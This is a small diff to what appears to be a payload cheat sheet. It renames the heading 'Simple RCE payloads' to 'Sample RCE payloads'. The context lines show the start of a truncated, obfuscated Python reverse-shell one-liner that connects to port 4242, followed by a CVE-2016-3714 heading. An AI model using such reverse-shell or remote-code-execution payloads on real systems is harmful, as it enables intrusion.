@@ -43,7 +43,7 @@ py -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda _
 ```
 
 
-## Simple RCE payloads:
+## Sample RCE payloads:
 ### CVE-2016-3714:
 
 ```
